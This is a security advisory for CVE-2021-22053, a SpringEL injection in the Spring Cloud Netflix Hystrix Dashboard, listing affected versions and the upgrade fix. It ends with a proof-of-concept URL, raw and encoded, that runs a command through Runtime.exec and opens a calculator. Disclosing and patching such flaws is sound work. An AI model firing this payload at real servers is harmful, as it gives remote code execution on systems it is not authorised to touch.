## CVE-2021-22053: Spring Cloud Netflix Hystrix Dashboard template resolution vulnerability

### Severity
High

### Vendor
Spring by VMware

### Description
Applications using both `spring-cloud-netflix-hystrix-dashboard` and `spring-boot-starter-thymeleaf` expose a way to execute code submitted within the request URI path during the resolution of view templates. When a request is made at `/hystrix/monitor;[user-provided data]`, the path elements following `hystrix/monitor` are being evaluated as SpringEL expressions, which can lead to code execution.

### Affected VMware Products and Versions
Severity is high unless otherwise noted.
- Spring Cloud Netflix
  - 2.2.0.RELEASE to 2.2.9.RELEASE
  - Older, unsupported versions are also affected

### Mitigation
Users of affected versions should apply the following mitigation: Users should upgrade to 2.2.10.RELEASE+. No other steps are necessary. Releases that have fixed this issue include:
- Spring Cloud Netflix
  - 2.2.10.RELEASE+

### Credit
This vulnerability was identified and responsibly reported by threedr3am of SecCoder Security Lab (threedr3am@foxmail.com).

### References
https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:L

### History
2021-11-17: Initial vulnerability report published.

### POC
raw:
```
http://127.0.0.1:8080/hystrix/;a=a/__${T (java.lang.Runtime).getRuntime().exec("open -a calculator")}__::.x/
```
encode:
```
http://127.0.0.1:8080/hystrix/;a=a/__$%7BT%20(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22)%7D__::.x/
```
PS. The diagonal bar'/' cannot be carried in the command